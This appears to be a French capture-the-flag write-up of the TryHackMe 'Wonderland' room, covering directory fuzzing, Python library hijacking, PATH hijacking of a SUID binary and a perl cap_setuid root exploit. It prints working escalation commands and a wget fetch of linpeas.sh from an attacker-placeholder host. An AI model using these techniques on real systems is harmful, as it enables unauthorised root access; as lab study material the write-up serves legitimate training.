# Wonderland - TryHackMe Write-up

## 🎯 Objectif
Ce dépôt documente la résolution de la room **"Wonderland"** sur TryHackMe. L'objectif est de compromettre une machine Linux en partant d'une énumération web pour obtenir un accès initial, puis d'effectuer des mouvements latéraux et une escalade de privilèges verticale jusqu'à obtenir les droits **root**.

**Compétences démontrées :**
* **Énumération Web** (Fuzzing de répertoires).
* **Mouvement Latéral** (Python Library Hijacking).
* **Escalade de privilèges** (Manipulation du PATH & SUID).
* **Exploitation de Capacités Linux** (Capabilities).

---

## 🔍 1. Reconnaissance & Accès Initial

### Énumération
Le scan initial révèle des ports SSH et HTTP ouverts. L'utilisation de **Gobuster** pour la découverte de répertoires cachés nous a menés dans une structure de dossiers profonde :
1.  Découverte de `/r`
2.  Puis `/r/a` -> `/r/a/b` ... -> `/r/a/b/b/i/t`

En inspectant le code source de la page finale, nous avons identifié des identifiants : `alice:heudghjregihjqgru`.
Ces identifiants ont permis une connexion SSH réussie sur le compte de l'utilisateur **alice**.

---

## 🐇 2. Mouvement Latéral : Alice vers Rabbit
*(Technique : Python Library Hijacking)*

Dans le dossier d'Alice, nous trouvons un script Python que nous pouvons exécuter en tant que **rabbit** via `sudo -l`.
Le script contient la ligne `import random`. Comme le script est exécuté depuis le répertoire courant et que Python cherche les modules dans le répertoire actuel en priorité, nous pouvons exploiter cela.

**Exploitation :**
Nous créons un fichier malveillant nommé `random.py` dans le même répertoire contenant :

```python
import os
os.system("/bin/bash")
# /bin/bash : Starts a new bash shell session.
```
Python charge les modules depuis le répertoire courant en priorité. Cette configuration permet un détournement de bibliothèque Python.

Nous rendons ce fichier exécutable : `chmod +x random.py`. En exécutant le script principal en tant que rabbit, notre module `random.py` est chargé, nous donnant un shell en tant que rabbit.

## 🎩 3. Escalade de Privilèges : Rabbit vers Hatter
*(Technique : SUID Binary & PATH Hijacking)*

Dans le dossier `/home/rabbit`, nous découvrons un binaire nommé `teaParty`. C'est un fichier **SUID**, ce qui signifie qu'il s'exécute avec les permissions de son propriétaire (ici, `hatter`).

**Analyse du binaire :** Lors de l'exécution, le programme affiche un message et une date future.

Pour comprendre son fonctionnement, nous analysons le binaire. Nous remarquons l'appel à la commande système `date` (et `/bin/echo`).

**Vulnérabilité :** Le code utilise `/bin/echo` (chemin absolu, sécurisé) mais utilise simplement `date` (chemin relatif, vulnérable). Le système va donc chercher l'exécutable `date` dans les dossiers listés par la variable `$PATH`.

**Exploitation :**

Nous créons un script malveillant nommé `date` qui lance un shell (`/bin/bash`).

Nous modifions la variable `$PATH` pour inclure notre dossier actuel (`/home/rabbit`) au tout début.

> **Note :** Nous ajoutons le PATH existant à la fin pour ne pas casser les fonctionnalités système de base, tout en priorisant notre binaire.

```bash
export PATH=/home/rabbit:$PATH
```

* `/home/rabbit` : Le dossier où se trouve notre faux script "date".
* `:$PATH` : Ajoute le chemin existant à la suite.

En relançant `./teaParty`, le binaire exécute notre faux script `date` avec les droits de `hatter`. Nous obtenons un shell pour l'utilisateur `hatter`.

## 👑 4. Escalade de Privilèges : Hatter vers Root
*(Technique : Linux Capabilities)*

Une fois connecté en tant que `hatter`, nous transférons et exécutons **LinPEAS** pour scanner le système.

```bash
python3 -m http.server # Sur la machine attaquante
wget http://IP_ATTAQUANT:8000/linpeas.sh # Sur la victime
chmod +x linpeas.sh
./linpeas.sh
```
LinPEAS identifie que l'interpréteur `perl` possède des "capabilities" étendues (`cap_setuid+ep`).

### Explication de la vulnérabilité
La capability `CAP_SETUID` permet au binaire de manipuler son propre UID (User ID). Si elle est définie sur un binaire comme `perl`, elle peut être utilisée comme une backdoor pour devenir `root`.

### Exploitation
Nous utilisons une commande issue de **GTFOBins** pour exploiter cette capability :

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
perl -e : Exécute le script suivant.

use POSIX qw(setuid); : Importe la fonction setuid.

POSIX::setuid(0); : Définit l'ID utilisateur à 0 (Root).

exec "/bin/sh"; : Lance un shell avec ces nouveaux privilèges.

Nous sommes maintenant root. Pour rendre le shell plus agréable (autocomplétion, historique), nous le stabilisons :
python3 -c 'import pty;pty.spawn("/bin/bash")'
Le flag final se trouve dans /root/user.txt.
